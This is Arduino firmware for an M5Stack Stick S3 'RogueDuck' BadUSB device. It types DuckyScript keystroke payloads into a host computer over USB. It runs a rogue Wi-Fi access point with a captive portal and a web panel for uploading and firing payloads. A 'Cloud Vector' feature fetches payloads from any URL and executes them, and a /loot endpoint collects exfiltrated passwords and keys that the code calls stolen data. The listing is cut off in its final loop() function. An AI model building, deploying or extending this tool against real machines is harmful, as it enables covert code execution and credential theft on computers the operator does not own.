/*
 *  ██████╗  ██████╗  ██████╗ ██╗   ██╗███████╗██████╗ ██╗   ██╗ ██████╗██╗  ██╗
 *  ██╔══██╗██╔═══██╗██╔════╝ ██║   ██║██╔════╝██╔══██╗██║   ██║██╔════╝██║ ██╔╝
 *  ██████╔╝██║   ██║██║  ███╗██║   ██║█████╗  ██║  ██║██║   ██║██║     █████╔╝ 
 *  ██╔══██╗██║   ██║██║   ██║██║   ██║██╔══╝  ██║  ██║██║   ██║██║     ██╔═██╗ 
 *  ██║  ██║╚██████╔╝╚██████╔╝╚██████╔╝███████╗██████╔╝╚██████╔╝╚██████╗██║  ██╗
 *  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═════╝  ╚═════╝  ╚═════╝╚═╝  ╚═╝
 *
 *  =============================================================================
 *  PROJECT   : M5Stack Stick S3 - RogueDuck V2.1 HID Injector (Cyberpunk CRT Edition)
 *  AUTHOR    : @M5RogueOps
 *  COMMUNITY : https://www.ethicalhackersden.org
 *  =============================================================================
 *  
 *  FEATURES:
 *  - Dual-Mode Wi-Fi: AP + STA operation with Captive Portal DNS redirection.
 *  - Global Access: Tunneling support for Ngrok/Cloudflared for remote control.
 *  - Mobile-First Web UI: Dark-mode, responsive controls for on-the-go deployment.
 *  - Payload Management: OTA upload, live browser editor, file listing & deletion.
 *  - Cloud Vector: Fetch and execute remote payloads directly into RAM.
 *  - Tactical Data Exfiltration: POST loot (passwords/keys) to /loot for viewing.
 *  - Cyberpunk CRT UI: Hardware-level scanline aesthetic with glitch injection effects.
 *  - Panic Wipe: Dedicated killswitch to securely format LittleFS storage.
 *  - Physical Control: Payload selection (BtnB) and execution (BtnA) with Pocket Lock.
 *  - Real-time Telemetry: Live battery monitoring and dynamic IP rendering.
 *
 */

#include <Arduino.h>
#include <M5Unified.h>
#include <WiFi.h>
#include <WebServer.h>
#include <LittleFS.h>
#include <vector>
#include "USB.h"
#include "USBHIDKeyboard.h"
#include <HTTPClient.h>
#include <DNSServer.h>
#include <Preferences.h>
Preferences prefs;

void saveWifi(String ssid, String pass) {
    prefs.begin("wifi_config", false);
    prefs.putString("ssid", ssid);
    prefs.putString("password", pass);
    prefs.end();
}

String getSSID() {
    prefs.begin("wifi_config", true);
    String ssid = prefs.getString("ssid", "");
    prefs.end();
    return ssid;
}

String getPass() {
    prefs.begin("wifi_config", true);
    String pass = prefs.getString("password", "");
    prefs.end();
    return pass;
}

// --- Cyberpunk CRT Colors (RGB565 format) ---
#define CYBER_GREEN M5.Display.color565(0, 255, 65)
#define CYBER_DARK  M5.Display.color565(0, 40, 10)
#define CYBER_RED   M5.Display.color565(255, 0, 60)

// --- Configuration ---
const char* AP_SSID = "RogueDuck_Sync";
const char* AP_PASS = "12345678"; // Must be at least 8 chars - You could change this (optional)


WebServer server(80);
const byte DNS_PORT = 53;
DNSServer dnsServer;
USBHIDKeyboard Keyboard;
File fsUploadFile;

// --- State ---
std::vector<String> payloadFiles;
int selectedFileIndex = 0;
bool isSending = false;
bool isDimmed = false; // NEW: Tracks battery saver state

// DuckyScript runtime state
uint32_t defaultDelay = 0;
String   lastLine     = "";

// ---------------------------------------------------------------
// File system helpers
// ---------------------------------------------------------------
void refreshFileList() {
    payloadFiles.clear();
    File root = LittleFS.open("/");
    File file = root.openNextFile();
    while (file) {
        if (!file.isDirectory() && String(file.name()).endsWith(".txt")) {
            payloadFiles.push_back(String(file.name()));
        }
        file = root.openNextFile();
    }
    if (selectedFileIndex >= (int)payloadFiles.size()) selectedFileIndex = 0;
}

// --- Web App HTML UI ---
String buildIndexHtml() {
    String html;
    html.reserve(5500); // Increased buffer size for the new layout
    html += F(
        "<!DOCTYPE html><html><head>"
        "<title>Payload Uploader</title>"
        "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">"
        "<style>"
        "*{box-sizing:border-box;font-family:'Courier New',monospace;}"
        "body{margin:0;padding:12px;background:#000;color:#0f0;-webkit-tap-highlight-color:transparent;}"
        "h2{text-align:center;margin:0 0 15px 0;font-size:1.3rem;text-transform:uppercase;border-bottom:1px solid #0f0;padding-bottom:10px;text-shadow:0 0 5px #0f0;}"
        ".container{background:#050505;padding:16px;border-radius:8px;border:1px solid #0f0;box-shadow:0 0 12px rgba(0,255,0,0.15);margin-bottom:20px;width:100%;}"
        "input[type=text],input[type=password]{width:100%;padding:12px;margin:8px 0;box-sizing:border-box;background:#111;color:#0f0;border:1px solid #0f0;}button{width:100%;padding:12px;margin-top:10px;cursor:pointer;}"
        "input[type=file],input[type=text],textarea{width:100%;padding:12px;font-size:16px;border-radius:4px;border:1px solid #333;background:#000;color:#0f0;margin-bottom:12px;}"
        "input[type=text]:focus,textarea:focus{border-color:#0f0;outline:none;box-shadow:0 0 5px #0f0;}"
        "input[type=file]::file-selector-button{background:#0f0;color:#000;border:none;padding:8px 12px;border-radius:4px;font-weight:bold;margin-right:10px;}"
        "input[type=submit]{background:#0f0;color:#000;padding:16px;border:none;border-radius:4px;font-size:16px;font-weight:bold;text-transform:uppercase;width:100%;display:block;}"
        "input[type=submit]:active{background:#0a0;}"
        "textarea{height:180px;}"
        ".file-row{display:flex;flex-direction:column;background:#0a0a0a;padding:12px;border-radius:6px;border:1px solid #333;margin-bottom:12px;gap:12px;}"
        ".file-row span{word-break:break-all;font-size:1.1rem;color:#fff;text-align:center;}"
        ".btn-group{display:flex;gap:8px;width:100%;}"
        "button{flex:1;padding:14px 0;border:none;border-radius:4px;font-size:14px;font-weight:bold;text-transform:uppercase;font-family:'Courier New',monospace;}"
        ".fire{background:#0f0;color:#000;}"
        ".fire:active{background:#fff;}"
        ".edit{background:#f39c12;color:#000;}"
        ".del{background:#111;color:#f00;border:1px solid #f00;}"
        ".del:active{background:#f00;color:#000;}"
        ".row{display:flex;flex-direction:column;align-items:stretch;gap:5px;margin-bottom:10px;}"
        ".row label{color:#aaa;font-weight:bold;}"
        ".empty{opacity:.6;text-align:center;padding:12px;}"
        ".footer{text-align:center;margin-top:10px;padding:20px 0;border-top:1px dashed #0f0;font-size:13px;color:#aaa;line-height:1.6;}"
        ".footer a{color:#0f0;text-decoration:none;font-weight:bold;}"
        ".footer a:hover{text-shadow:0 0 8px #0f0;}"
        "</style>"
        "<script>"
        "function editF(f) {"
        "  fetch('/read?file=' + f)"
        "    .then(r => r.text())"
        "    .then(t => {"
        "      document.getElementById('filename').value = f;"
        "      document.getElementsByName('content')[0].value = t;"
        "      window.scrollTo(0, 0);"
        "    });"
        "}"
        "</script>"
        "</head><body>"

        "<div class=\"container\">"
        "<h2>Upload .txt Payload</h2>"
        "<form method=\"POST\" action=\"/upload\" enctype=\"multipart/form-data\">"
        "<input type=\"file\" name=\"file\" accept=\".txt\"><br>"
        "<input type=\"submit\" value=\"Upload to Device\">"
        "</form></div>"

        "<div class=\"container\">"
        "<h2>Paste DuckyScript</h2>"
        "<form method=\"POST\" action=\"/save\">"
        "<div class=\"row\"><label for=\"filename\">Filename:</label>"
        "<input type=\"text\" id=\"filename\" name=\"filename\" value=\"payload.txt\" required></div>"
        "<textarea name=\"content\" placeholder=\"REM My payload&#10;DELAY 1000&#10;GUI r&#10;DELAY 500&#10;STRINGLN notepad&#10;STRING Hello from M5!\"></textarea>"
        "<input type=\"submit\" value=\"Save to Device\">"
        "</form></div>"

        "<div class=\"container\">"
        "<h2>Deploy Cloud Vector</h2>"
        "<form method=\"POST\" action=\"/cloud\">"
        "<div class=\"row\"><label for=\"url\">Raw URL:</label>"
        "<input type=\"text\" id=\"url\" name=\"url\" placeholder=\"https://raw.githubusercontent.com/...\" required></div>"
        "<input type=\"submit\" value=\"FETCH & INJECT\">"
        "</form></div>"

        "<div class=\"container\">"
        "<h2>Stored Payloads</h2>"
    );

    if (payloadFiles.empty()) {
        html += F("<div class=\"empty\">No .txt files on device.</div>");
    } else {
        for (auto& f : payloadFiles) {
            html += F("<div class=\"file-row\"><span>");
            html += f;
            html += F("</span><div class=\"btn-group\">"
                      
                      "<form method=\"POST\" action=\"/fire\" style=\"margin:0; flex:1;\">"
                      "<input type=\"hidden\" name=\"filename\" value=\"");
            html += f;
            html += F("\"><button class=\"fire\" style=\"width:100%;\" type=\"submit\">INJECT</button></form>"
                      
                      "<button class=\"edit\" type=\"button\" onclick=\"editF('");
            html += f;
            html += F("')\">Edit</button>"
                      
                      "<form method=\"POST\" action=\"/delete\" "
                      "onsubmit=\"return confirm('Delete this file?');\" style=\"margin:0; flex:1;\">"
                      "<input type=\"hidden\" name=\"filename\" value=\"");
            html += f;
            html += F("\"><button class=\"del\" style=\"width:100%;\" type=\"submit\">Delete</button></form>"
                      
                      "</div></div>");
        }
    }

    html += F(
        "<div style=\"margin-top:25px; border-top:1px dashed #333; padding-top:20px;\">"
        "<form method=\"POST\" action=\"/wipe\" onsubmit=\"return confirm('WARNING: WIPE ALL PAYLOADS?');\">"
        "<button class=\"del\" style=\"background:#8b0000; color:#fff; border:1px solid #f00; padding:18px; width:100%; font-size:16px; font-weight:bold; letter-spacing:2px;\" type=\"submit\">[ PANIC WIPE ]</button>"
        "</form></div>"
        "</div>" // Closes the Stored Payloads container

        "<div class=\"container\">"
        "<h2>Exfiltrated Data</h2>"
        "<form action=\"/viewloot\" method=\"GET\">"
        "<button class=\"btn\" style=\"background:#555; width:100%;\" type=\"submit\">VIEW LOOT.TXT</button>"
        "</form>"
        "<div style=\"margin-top:10px;\">"
        "<form method=\"POST\" action=\"/clearloot\" onsubmit=\"return confirm('Wipe all looted data?');\">"
        "<button class=\"del\" style=\"background:#333; color:#aaa; border:1px solid #555; padding:10px; width:100%;\" type=\"submit\">[ CLEAR LOOT ]</button>"
        "</form></div></div>"

       "<form action=\"/settings\" method=\"POST\">"
"<input type=\"text\" name=\"ssid\" placeholder=\"SSID\" required>"
"<input type=\"password\" name=\"pass\" placeholder=\"Password\">"
"<button type=\"submit\">SAVE & REBOOT</button>"
"</form>"

        // --- DEVELOPMENT CREDITS (REQUIRED TO REMAIN INTACT) ---
        "<div class=\"footer\">"
        "ROGUEDUCK V2.1 BY <a href=\"https://github.com/M5RogueOps\" target=\"_blank\">@M5ROGUEOPS</a><br><br>"
        "POWERED BY <a href=\"https://www.ethicalhackersden.org\" target=\"_blank\">ETHICAL HACKERS DEN</a>"
        "</div>"

        "</body></html>"
    );
    
    return html;
}
// ---------------------------------------------------------------
// Physical TFT Screen UI (Cyberpunk Style)
// ---------------------------------------------------------------
void drawUI() {
    M5.Display.fillScreen(TFT_BLACK);

    int w = M5.Display.width();
    int h = M5.Display.height();

    // Draw CRT Scanlines (Every other pixel row)
    for (int y = 0; y < h; y += 2) {
        M5.Display.drawFastHLine(0, y, w, CYBER_DARK);
    }

    M5.Display.setTextWrap(false);

    // --- EXECUTION / GLITCH SCREEN ---
    if (isSending) {
        // Draw heavy, randomized scanlines
        for (int y = 0; y < h; y += random(2, 6)) {
            M5.Display.drawFastHLine(0, y, w, CYBER_DARK);
        }

        int glitchX = random(-5, 6);
        int glitchY = random(-4, 5);
        
        M5.Display.setTextColor(CYBER_RED); 
        M5.Display.setTextSize(2.0, 2.5); // Stretched text
        M5.Display.setCursor(w/2 - 50 + glitchX, h/2 - 20 + glitchY);
        M5.Display.print("INJECTING");
        
        M5.Display.setTextSize(1);
        M5.Display.setCursor(w/2 - 40, h/2 + 20);
        M5.Display.setTextColor(TFT_WHITE);
        if (!payloadFiles.empty()) {
            M5.Display.print(payloadFiles[selectedFileIndex]);
        }
        
        // Random green and red artifact blocks
        for(int i=0; i<3; i++) {
            M5.Display.fillRect(random(0, w), random(0, h), random(10, 80), random(2, 10), random(0, 2) ? CYBER_GREEN : CYBER_RED);
        }
        return;
    }

// --- NORMAL TERMINAL UI ---
    M5.Display.setTextSize(1); 

    // Header
    M5.Display.setTextSize(1.0, 1.5); // 1 wide 1.5 font height
    M5.Display.setTextColor(CYBER_GREEN);
    M5.Display.setCursor(2, 2);
    M5.Display.print("[ROGUEDUCK V2.1]");
    
    // --- BATTERY STATUS ---
    M5.Display.setTextSize(1);
    int batLevel = M5.Power.getBatteryLevel();
    
    // Turn red if battery is critically low
    if (batLevel < 20) {
        M5.Display.setTextColor(CYBER_RED);
    } else {
        M5.Display.setTextColor(CYBER_GREEN);
    }
    
    // Right-align the battery text
    M5.Display.setTextSize(1.0, 1.5); // 1 wide 1.5 font height
    M5.Display.setCursor(w - 26, 2); 
    M5.Display.printf("%d%%", batLevel);

    // --- NEW LARGE IP DISPLAY ---
    M5.Display.setTextSize(1.0, 1.5); // 1 wide 1.5 font height
    M5.Display.setTextColor(TFT_WHITE);
    M5.Display.setCursor(101, 2); // shifted position
    
   if (WiFi.status() == WL_CONNECTED) {
        M5.Display.print("IP " + WiFi.localIP().toString());
    } else {
        M5.Display.print("IP " + WiFi.softAPIP().toString());
    }
    
    // Reset text size back to normal for the rest of the UI
    M5.Display.setTextSize(1);
    
    // Top Divider (Pushed up to Y=17)
    M5.Display.drawFastHLine(0, 17, w, CYBER_GREEN);

    // Payload List
    if (payloadFiles.empty()) {
        M5.Display.setTextColor(CYBER_RED);
        M5.Display.setCursor(2, 22); // Shifted UP under the divider
        M5.Display.println("NO VECTORS");
        M5.Display.setCursor(2, 34); // Shifted UP and fixed overlap
        M5.Display.println("AWAITING UPLINK");
    } else {
        int maxItems = 3;
        int startIdx = max(0, selectedFileIndex - 1);
        if (startIdx + maxItems > (int)payloadFiles.size()) {
            startIdx = max(0, (int)payloadFiles.size() - maxItems);
        }

        int startY = 22; // Shifted UP right under the divider line
        for (int i = startIdx; i < min((int)payloadFiles.size(), startIdx + maxItems); i++) {
            M5.Display.setCursor(4, startY + 2);
            if (i == selectedFileIndex) {
                M5.Display.fillRect(0, startY, w, 12, CYBER_GREEN);
                M5.Display.setTextColor(TFT_BLACK, CYBER_GREEN); 
                M5.Display.print("> ");
                M5.Display.print(payloadFiles[i]);
            } else {
                M5.Display.setTextColor(CYBER_GREEN); 
                M5.Display.print("  ");
                M5.Display.print(payloadFiles[i]);
            }
            startY += 14;
        }
    }
    
    // Bottom Divider & Controls
    M5.Display.drawFastHLine(0, h - 14, w, CYBER_GREEN);
    M5.Display.setTextColor(CYBER_GREEN);
    M5.Display.setCursor(2, h - 10);
    M5.Display.print("BTN_A:INJECT PAYLOAD  BTN_B:SCROLL");
}
// ---------------------------------------------------------------
// Web server handlers
// ---------------------------------------------------------------
void handleRoot() {
    server.send(200, "text/html", buildIndexHtml());
}
void handleSettings() {
    if (server.hasArg("ssid") && server.hasArg("pass")) {
        saveWifi(server.arg("ssid"), server.arg("pass"));
        server.send(200, "text/html", "<h2>Settings Saved! Rebooting...</h2>");
        delay(1000);
        ESP.restart();
    }
}
void handleViewLoot() {
    if (!LittleFS.exists("/loot.txt")) {
        server.send(404, "text/plain", "Loot file is empty or does not exist.");
        return;
    }

    File f = LittleFS.open("/loot.txt", "r");
    server.streamFile(f, "text/plain");
    f.close();
}
void handleClearLoot() {
    if (LittleFS.exists("/loot.txt")) {
        LittleFS.remove("/loot.txt");
        server.send(200, "text/html", "<h2>Loot wiped.</h2><br><a href='/'>Go Back</a>");
    } else {
        server.send(404, "text/html", "<h2>No loot file found.</h2><br><a href='/'>Go Back</a>");
    }
}
void handleLoot() {
    // Check if the request contains data
    if (!server.hasArg("plain")) {
        server.send(400, "text/plain", "No loot detected.");
        return;
    }

    // Open (or create) loot.txt in append mode
    File f = LittleFS.open("/loot.txt", "a");
    if (!f) {
        server.send(500, "text/plain", "Failed to open loot file.");
        return;
    }

    // Write the received data + a newline
    f.println(server.arg("plain"));
    f.close();

    Serial.println("Loot received and saved to loot.txt");
    server.send(200, "text/plain", "Loot secured.");
}
void handleUpload() {
    HTTPUpload& upload = server.upload();
    if (upload.status == UPLOAD_FILE_START) {
        String filename = upload.filename;
        if (!filename.startsWith("/")) filename = "/" + filename;
        Serial.print("Receiving: "); Serial.println(filename);
        fsUploadFile = LittleFS.open(filename, "w");
    } else if (upload.status == UPLOAD_FILE_WRITE) {
        if (fsUploadFile) fsUploadFile.write(upload.buf, upload.currentSize);
    } else if (upload.status == UPLOAD_FILE_END) {
        if (fsUploadFile) fsUploadFile.close();
        refreshFileList();
        drawUI();
    }
}

static String sanitizeFilename(String name) {
    name.trim();
    name.replace("\\", "");
    name.replace("/", "");
    name.replace("..", "");
    if (name.length() == 0) name = "payload.txt";
    if (!name.endsWith(".txt")) name += ".txt";
    return "/" + name;
}

void handleSave() {
    if (!server.hasArg("filename") || !server.hasArg("content")) {
        server.send(400, "text/html",
            "<h2>Missing filename or content.</h2><br><a href='/'>Go Back</a>");
        return;
    }
    String path = sanitizeFilename(server.arg("filename"));
    String body = server.arg("content");

    File f = LittleFS.open(path, "w");
    if (!f) {
        server.send(500, "text/html",
            "<h2>Failed to open file for writing.</h2><br><a href='/'>Go Back</a>");
        return;
    }
    f.print(body);
    f.close();

    Serial.print("Saved pasted script: "); Serial.println(path);
    refreshFileList();
    drawUI();

    String resp = "<h2>Saved " + path + "</h2><br><a href='/'>Go Back</a>";
    server.send(200, "text/html", resp);
}

void handleDelete() {
    if (!server.hasArg("filename")) {
        server.send(400, "text/html",
            "<h2>Missing filename.</h2><br><a href='/'>Go Back</a>");
        return;
    }
    String path = server.arg("filename");
    path.trim();
    if (!path.startsWith("/")) path = "/" + path;

    if (path.indexOf("..") >= 0) {
        server.send(400, "text/html",
            "<h2>Invalid filename.</h2><br><a href='/'>Go Back</a>");
        return;
    }

    bool ok = LittleFS.exists(path) && LittleFS.remove(path);
    Serial.print(ok ? "Deleted: " : "Failed to delete: ");
    Serial.println(path);

    refreshFileList();
    if (selectedFileIndex >= (int)payloadFiles.size()) selectedFileIndex = 0;
    drawUI();

    String resp = ok
        ? ("<h2>Deleted " + path + "</h2><br><a href='/'>Go Back</a>")
        : ("<h2>Could not delete " + path + "</h2><br><a href='/'>Go Back</a>");
    server.send(ok ? 200 : 404, "text/html", resp);
}

// ===============================================================
// DuckyScript 1.0 Parser - Todo List: 3.0 or as close as possible
// ===============================================================
uint16_t duckyTokenToKey(const String& tokRaw) {
    String t = tokRaw;
    t.trim();
    if (t.length() == 0) return 0;

    if (t.length() == 1) {
        return (uint8_t)t.charAt(0);
    }

    String u = t;
    u.toUpperCase();

    if (u == "CTRL" || u == "CONTROL")          return KEY_LEFT_CTRL;
    if (u == "SHIFT")                           return KEY_LEFT_SHIFT;
    if (u == "ALT")                             return KEY_LEFT_ALT;
    if (u == "GUI" || u == "WINDOWS" || u == "WIN" || u == "COMMAND")
                                                return KEY_LEFT_GUI;

    if (u == "ENTER" || u == "RETURN")          return KEY_RETURN;
    if (u == "TAB")                             return KEY_TAB;
    if (u == "SPACE")                           return ' ';
    if (u == "ESC" || u == "ESCAPE")            return KEY_ESC;
    if (u == "BACKSPACE")                       return KEY_BACKSPACE;
    if (u == "DELETE" || u == "DEL")            return KEY_DELETE;
    if (u == "INSERT")                          return KEY_INSERT;
    if (u == "HOME")                            return KEY_HOME;
    if (u == "END")                             return KEY_END;
    if (u == "PAGEUP")                          return KEY_PAGE_UP;
    if (u == "PAGEDOWN")                        return KEY_PAGE_DOWN;
    if (u == "CAPSLOCK")                        return KEY_CAPS_LOCK;
    if (u == "NUMLOCK")                         return KEY_NUM_LOCK;
    if (u == "SCROLLLOCK")                      return KEY_SCROLL_LOCK;
    if (u == "PRINTSCREEN")                     return KEY_PRINT_SCREEN;
    if (u == "BREAK" || u == "PAUSE")           return KEY_PAUSE;
    if (u == "MENU" || u == "APP")              return KEY_MENU;

    if (u == "UP"    || u == "UPARROW")         return KEY_UP_ARROW;
    if (u == "DOWN"  || u == "DOWNARROW")       return KEY_DOWN_ARROW;
    if (u == "LEFT"  || u == "LEFTARROW")       return KEY_LEFT_ARROW;
    if (u == "RIGHT" || u == "RIGHTARROW")      return KEY_RIGHT_ARROW;

    if (u.length() >= 2 && u.charAt(0) == 'F') {
        int n = u.substring(1).toInt();
        if (n >= 1 && n <= 12) {
            return KEY_F1 + (n - 1);
        }
    }

    return 0;
}

void pressCombo(const std::vector<uint16_t>& keys) {
    for (auto k : keys) Keyboard.press(k);
    delay(20);
    for (auto it = keys.rbegin(); it != keys.rend(); ++it) {
        Keyboard.release(*it);
    }
}

static void splitFirst(const String& line, String& head, String& rest) {
    int sp = line.indexOf(' ');
    if (sp < 0) { head = line; rest = ""; }
    else        { head = line.substring(0, sp); rest = line.substring(sp + 1); }
}

static std::vector<String> splitDash(const String& s) {
    std::vector<String> out;
    int start = 0;
    while (start <= (int)s.length()) {
        int dash = s.indexOf('-', start);
        if (dash < 0) { out.push_back(s.substring(start)); break; }
        out.push_back(s.substring(start, dash));
        start = dash + 1;
    }
    return out;
}

bool executeLine(const String& rawLine);

static bool executeLineInner(const String& rawLine) {
    String line = rawLine;
    line.trim();
    if (line.length() == 0) return true;

    String head, rest;
    splitFirst(line, head, rest);
    String HEAD = head; HEAD.toUpperCase();

    if (HEAD == "REM" || HEAD.startsWith("//")) return true;

    if (HEAD == "DELAY") {
        delay((uint32_t) rest.toInt());
        return true;
    }
    if (HEAD == "DEFAULT_DELAY" || HEAD == "DEFAULTDELAY") {
        defaultDelay = (uint32_t) rest.toInt();
        return true;
    }
    if (HEAD == "STRING") { Keyboard.print(rest); return true; }
    if (HEAD == "STRINGLN") {
        Keyboard.print(rest);
        Keyboard.press(KEY_RETURN); delay(10); Keyboard.release(KEY_RETURN);
        return true;
    }
    if (HEAD == "REPEAT") return true;

    if (head.indexOf('-') >= 0 && rest.length() == 0) {
        std::vector<String> parts = splitDash(head);
        std::vector<uint16_t> keys;
        for (auto& p : parts) {
            uint16_t k = duckyTokenToKey(p);
            if (k == 0) {
                Serial.print("[DuckyScript] Unknown token in chord: "); Serial.println(p);
                for (auto kk : keys) Keyboard.release(kk);
                return false;
            }
            keys.push_back(k);
        }
        pressCombo(keys);
        return true;
    }

    {
        uint16_t modKey = duckyTokenToKey(head);
        bool isMod = (modKey == KEY_LEFT_CTRL || modKey == KEY_LEFT_SHIFT ||
                      modKey == KEY_LEFT_ALT  || modKey == KEY_LEFT_GUI);
        if (isMod) {
            std::vector<uint16_t> keys;
            keys.push_back(modKey);
            String remainder = rest;
            while (remainder.length() > 0) {
                String h2, r2;
                splitFirst(remainder, h2, r2);
                uint16_t k = duckyTokenToKey(h2);
                if (k == 0) {
                    Serial.print("[DuckyScript] Unknown token: "); Serial.println(h2);
                    for (auto kk : keys) Keyboard.release(kk);
                    return false;
                }
                keys.push_back(k);
                remainder = r2;
            }
            pressCombo(keys);
            return true;
        }
    }

    if (rest.length() == 0) {
        uint16_t k = duckyTokenToKey(head);
        if (k != 0) {
            Keyboard.press(k); delay(20); Keyboard.release(k);
            return true;
        }
    }

    Serial.print("[DuckyScript] Unknown command: "); Serial.println(line);
    return false;
}

bool executeLine(const String& rawLine) {
    String line = rawLine;
    line.trim();
    if (line.length() == 0) return true;

    String head, rest;
    splitFirst(line, head, rest);
    String HEAD = head; HEAD.toUpperCase();

    if (HEAD == "REPEAT") {
        int n = rest.toInt();
        if (n <= 0 || lastLine.length() == 0) return true;
        for (int i = 0; i < n; i++) {
            executeLineInner(lastLine);
            if (defaultDelay) delay(defaultDelay);
        }
        return true;
    }

    bool ok = executeLineInner(line);
    if (HEAD != "REM" && line.length() > 0) lastLine = line;
    return ok;
}

// ---------------------------------------------------------------
// HID execution
// ---------------------------------------------------------------
void sendSelectedPayload() {
    if (payloadFiles.empty()) return;

    isSending = true;
    drawUI();

    defaultDelay = 0;
    lastLine     = "";

    String filepath = "/" + payloadFiles[selectedFileIndex];
    File file = LittleFS.open(filepath, "r");

    if (file) {
        String line;
        while (file.available()) {
            char c = file.read();
            if (c == '\r') continue;
            if (c == '\n') {
                executeLine(line);
                if (defaultDelay) delay(defaultDelay);
                line = "";
            } else {
                line += c;
            }
        }
        if (line.length() > 0) executeLine(line);
        file.close();
    } else {
        Serial.print("[DuckyScript] Failed to open: ");
        Serial.println(filepath);
    }

    isSending = false;
    drawUI();
}

// ---------------------------------------------------------------
// Main program
// ---------------------------------------------------------------
void handleFire() {
    if (!server.hasArg("filename")) {
        server.send(400, "text/plain", "Bad Request: No filename provided");
        return;
    }

    String targetFile = server.arg("filename");

    // Let's find the requested file in our payload array to sync it with my screen!
    bool found = false;
    for (int i = 0; i < payloadFiles.size(); i++) {
        if (payloadFiles[i] == targetFile) {
            selectedFileIndex = i; // Sync the Web UI choice with my physical LCD screen
            found = true;
            break;
        }
    }

    if (found && !isSending) {
        // Acknowledge the command quickly so the web browser doesn't hang
        server.send(200, "text/html", 
            "<html><head><meta http-equiv=\"refresh\" content=\"1;url=/\"></head>"
            "<body style=\"background:#222;color:#0f0;font-family:monospace;text-align:center;margin-top:50px;\">"
            "<h2>PAYLOAD DEPLOYED!</h2>"
            "<p>Returning to dashboard...</p></body></html>"
        );
        
        // Actually fire the payload!
        sendSelectedPayload(); 
    } else if (isSending) {
        server.send(429, "text/plain", "Wait! I am already sending a payload.");
    } else {
        server.send(404, "text/plain", "File not found in index.");
    }
}
void handleRead() {
    if (!server.hasArg("file")) {
        server.send(400, "text/plain", "Bad Request: No file specified");
        return;
    }

    String path = "/" + server.arg("file");
    
    if (!LittleFS.exists(path)) {
        server.send(404, "text/plain", "File not found on device");
        return;
    }

    // Open the file in read mode
    File file = LittleFS.open(path, "r");
    
    // Stream it directly to the web browser as plain text!
    server.streamFile(file, "text/plain");
    file.close();
}
void handleWipe() {
    LittleFS.format(); // Formats the entire LittleFS partition
    refreshFileList();
    drawUI();
    server.send(200, "text/html", "<h2>DEVICE WIPED.</h2><br><a href='/'>Go Back</a>");
}
// ---------------------------------------------------------------
// CLOUD PAYLOAD ENGINE
// ---------------------------------------------------------------
void fetchAndFireCloud(String url) {
    if (WiFi.status() != WL_CONNECTED) {
        Serial.println("No Internet. Cannot fetch cloud payload.");
        return;
    }

    isSending = true;
    drawUI();

    HTTPClient http;
    http.begin(url); // Point the ESP32 at the URL
    int httpCode = http.GET(); // Attempt to download

    if (httpCode == HTTP_CODE_OK) {
        // We got the file! Read it from the internet stream
        WiFiClient* stream = http.getStreamPtr();
        String line = "";
        
        defaultDelay = 0;
        lastLine = "";

        while (http.connected() && (stream->available() > 0 || stream->peek() != -1)) {
            char c = stream->read();
            if (c == '\r') continue;
            if (c == '\n') {
                executeLine(line);
                if (defaultDelay) delay(defaultDelay);
                line = "";
            } else {
                line += c;
            }
        }
        // Execute the final line if the file didn't end with a newline
        if (line.length() > 0) executeLine(line);
        
    } else {
        Serial.printf("Cloud Fetch Failed. HTTP Error: %d\n", httpCode);
    }

    http.end();
    isSending = false;
    drawUI();
}
void handleCloudDrop() {
    if (!server.hasArg("url")) {
        server.send(400, "text/html", "<h2>Missing URL.</h2><br><a href='/'>Go Back</a>");
        return;
    }
    
    String targetUrl = server.arg("url");
    
    // Acknowledge the request on the web app immediately
    server.send(200, "text/html", "<h2>Executing Cloud Payload from:</h2><p>" + targetUrl + "</p><br><a href='/'>Go Back</a>");
    
    // Fire the payload
    fetchAndFireCloud(targetUrl);
}

// captive portals make things easier
void handleCaptivePortal() {
    // Redirect all unknown traffic to the root of the M5Stick's IP
    server.sendHeader("Location", String("http://") + server.client().localIP().toString(), true);
    server.send(302, "text/plain", ""); // 302 means "Found, redirecting..."
    server.client().stop();
}
void setup() {
    // 1. WAKE ME UP FIRST!
    // Initialize the M5Unified hardware config
    auto cfg = M5.config();
    M5.begin(cfg);

    // 2. Now that I am awake, configure my display for your terminal UI
    M5.Display.setRotation(3); // Set to landscape rotation
    M5.Display.setTextSize(1);

    Serial.begin(115200);

    // 3. Mount the payload storage
    if (!LittleFS.begin(true)) {
        M5.Display.println("LittleFS Mount Failed!");
        return;
    }
    refreshFileList();

  // 4. Spin up the Rogue Access Point
    // --- DYNAMIC DUAL MODE WIFI SETUP ---
    String storedSSID = getSSID();
    
    // Set to dual mode if we have credentials, otherwise just AP mode
    if (storedSSID != "") {
        WiFi.mode(WIFI_AP_STA);
        WiFi.begin(storedSSID.c_str(), getPass().c_str());
        
        // Brief wait to see if it connects to the target network
        int attempts = 0;
        while (WiFi.status() != WL_CONNECTED && attempts < 10) { 
            delay(500);
            attempts++;
        }
    } else {
        WiFi.mode(WIFI_AP);
    }

    // Always start the AP as the fallback/management interface
    WiFi.softAP(AP_SSID, AP_PASS);

    // --- START CAPTIVE PORTAL DNS ---
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

    // 5. Configure the Web Server routes
    server.on("/", HTTP_GET, handleRoot);
    server.on("/upload", HTTP_POST, []() {
        server.send(200, "text/html",
                    "<h2>Upload Complete!</h2><br><a href='/'>Go Back</a>");
    }, handleUpload);
    server.on("/save", HTTP_POST, handleSave);
    server.on("/delete", HTTP_POST, handleDelete);
    server.on("/fire", HTTP_POST, handleFire); // <--- new fire button
    server.on("/read", HTTP_GET, handleRead); // <--- lets us edit the files
    server.on("/wipe", HTTP_POST, handleWipe); // <--- function to remotly wipe device
    server.on("/cloud", HTTP_POST, handleCloudDrop); // <--- Ads function to get payloads from raw text files hosted online
    server.on("/loot", HTTP_POST, handleLoot); // <--- this helps with Exfiltration 
    server.on("/clearloot", HTTP_POST, handleClearLoot); // <--- This helps us delete the stolen exfiltraion data
    server.on("/viewloot", HTTP_GET, handleViewLoot); //<--- helps view the stolen data from exfiltraion data from loot.txt
    server.on("/settings", HTTP_POST, handleSettings);

    // --- NEW: CATCH-ALL ROUTE ---
    // If the phone asks for captive.apple.com, this triggers the redirect
    server.onNotFound(handleCaptivePortal); 
    
    server.begin();

    // 6. Arm the BadUSB capabilities!
    Keyboard.begin();
    USB.begin();

    // 7. Draw the initial interface
    drawUI();
}
void loop() {
    // Keep the web server responsive
